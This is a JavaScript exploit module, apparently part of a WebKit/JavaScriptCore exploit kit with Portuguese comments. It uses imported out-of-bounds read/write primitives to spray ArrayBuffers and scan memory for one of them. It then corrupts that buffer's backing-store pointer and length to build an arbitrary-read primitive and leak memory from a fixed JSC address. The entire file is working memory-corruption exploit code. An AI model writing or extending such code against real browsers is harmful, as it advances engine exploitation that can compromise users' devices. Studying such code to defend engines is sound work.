// js/script3/testMemoryLeakViaJsonTC.mjs (ATUALIZADO PARA ESCANEAR A MEMÓRIA)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { toHex, AdvancedInt64 } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    oob_read_absolute, // Agora também precisamos da primitiva de leitura
    clearOOBEnvironment
} from '../core_exploit.mjs';

// --- Configuração para Exploit com Escaneamento de Memória ---
const SCAN_AND_READ_CONFIG = {
    SPRAY_COUNT: 500, // Aumentamos a pulverização para mais chances
    BUFFER_SIZE: 256, // Tamanho que procuraremos na memória
    SCAN_RANGE_KB: 16, // Escanear 16 KB de memória em busca do nosso buffer
    
    TARGET_READ_ADDRESS: 0x3BD820n, // Endereço que queremos ler (JSC::ProtoCallFrame::argument)

    OFFSET_TO_BYTE_LENGTH: 8,
    OFFSET_TO_BACKING_STORE: 16,
};
// --- Fim dos Parâmetros ---

function readBigInt64(dataview, offset) {
    const low = dataview.getUint32(offset, true);
    const high = dataview.getUint32(offset + 4, true);
    return (BigInt(high) << 32n) | BigInt(low);
}

export async function testArbitraryRead() {
    const FNAME = "testArbitraryReadWithScan";
    logS3(`--- Iniciando Tentativa de Leitura Arbitrária com Escaneamento de Memória ---`, "test", FNAME);

    if (typeof oob_read_absolute !== 'function') {
        logS3("A primitiva 'oob_read_absolute' é necessária para o escaneamento e não está disponível.", "error", FNAME);
        return;
    }

    await triggerOOB_primitive();

    // Etapa 1: Pulverizar o heap
    let sprayed_buffers = [];
    for (let i = 0; i < SCAN_AND_READ_CONFIG.SPRAY_COUNT; i++) {
        sprayed_buffers.push(new ArrayBuffer(SCAN_AND_READ_CONFIG.BUFFER_SIZE));
    }
    logS3(`${SCAN_AND_READ_CONFIG.SPRAY_COUNT} buffers de ${SCAN_AND_READ_CONFIG.BUFFER_SIZE} bytes pulverizados.`, "info", FNAME);
    
    // Etapa 2: Escanear a memória para encontrar um dos nossos buffers
    logS3(`Iniciando escaneamento de ${SCAN_AND_READ_CONFIG.SCAN_RANGE_KB} KB de memória...`, "info", FNAME);
    let found_ab_metadata_addr = null;
    const scan_limit = SCAN_AND_READ_CONFIG.SCAN_RANGE_KB * 1024;

    for (let offset = 0; offset < scan_limit; offset += 8) {
        try {
            const potential_metadata = oob_read_absolute(offset, 8);
            // Um ArrayBuffer de 256 bytes terá seu campo de tamanho (em um offset específico)
            // igual a 256. Vamos procurar por isso. O campo pode ter outros metadados nos bits superiores.
            // A suposição aqui é que o byteLength está no início de um bloco de 8 bytes.
            if ((potential_metadata & 0xFFFFFFFFn) === BigInt(SCAN_AND_READ_CONFIG.BUFFER_SIZE)) {
                
                // Encontramos um candidato! O endereço real do objeto é antes do campo de tamanho.
                const candidate_addr = BigInt(offset) - BigInt(SCAN_AND_READ_CONFIG.OFFSET_TO_BYTE_LENGTH);
                logS3(`CANDIDATO ENCONTRADO! Offset: ${toHex(offset)}, Addr. do Objeto: ${toHex(candidate_addr)}`, "good", FNAME);
                found_ab_metadata_addr = candidate_addr;
                break;
            }
        } catch (e) { /* Ignorar erros de leitura durante o scan */ }
    }

    if (!found_ab_metadata_addr) {
        logS3("Falha ao encontrar um buffer pulverizado na memória. Tente aumentar o SPRAY_COUNT ou SCAN_RANGE_KB.", "error", FNAME);
        clearOOBEnvironment();
        return;
    }

    // Etapa 3: Corromper o buffer encontrado
    try {
        const corruption_ptr_addr = found_ab_metadata_addr + BigInt(SCAN_AND_READ_CONFIG.OFFSET_TO_BACKING_STORE);
        const corruption_len_addr = found_ab_metadata_addr + BigInt(SCAN_AND_READ_CONFIG.OFFSET_TO_BYTE_LENGTH);
        const targetAddrAsInt64 = new AdvancedInt64('0x' + SCAN_AND_READ_CONFIG.TARGET_READ_ADDRESS.toString(16));

        logS3(`Corrompendo o buffer encontrado em ${toHex(found_ab_metadata_addr)}`, "warn", FNAME);
        oob_write_absolute(corruption_ptr_addr, targetAddrAsInt64, 8);
        oob_write_absolute(corruption_len_addr, 0xFFFFFFFF, 4);

        await PAUSE_S3(50);

        // Etapa 4: Encontrar o buffer corrompido e ler a memória
        for (let i = 0; i < sprayed_buffers.length; i++) {
            const ab = sprayed_buffers[i];
            if (ab.byteLength > SCAN_AND_READ_CONFIG.BUFFER_SIZE) {
                logS3(`--- SUCESSO: O buffer [${i}] foi transformado em uma ferramenta de leitura! ---`, "vuln", FNAME);
                let memory_reader_view = new DataView(ab);
                const leaked_data = readBigInt64(memory_reader_view, 0);

                const targetAddrHex = `0x${SCAN_AND_READ_CONFIG.TARGET_READ_ADDRESS.toString(16)}`;
                const leakedDataHex = `0x${leaked_data.toString(16)}`;
                logS3(`   >> DADO VAZADO de ${targetAddrHex}: ${leakedDataHex}`, "leak", FNAME);
                
                // Limpa e finaliza com sucesso
                clearOOBEnvironment();
                logS3("--- Primitiva de LEITURA ARBITRÁRIA construída com sucesso! ---", "vuln", FNAME);
                return;
            }
        }

    } catch (e) {
        logS3(`Erro durante a corrupção do buffer encontrado: ${e.message}`, "error", FNAME);
    }
    
    // Se chegou aqui, algo deu errado após encontrar o candidato.
    logS3("--- Teste concluído, mas a leitura final falhou. ---", "warn", FNAME);
    clearOOBEnvironment();
}
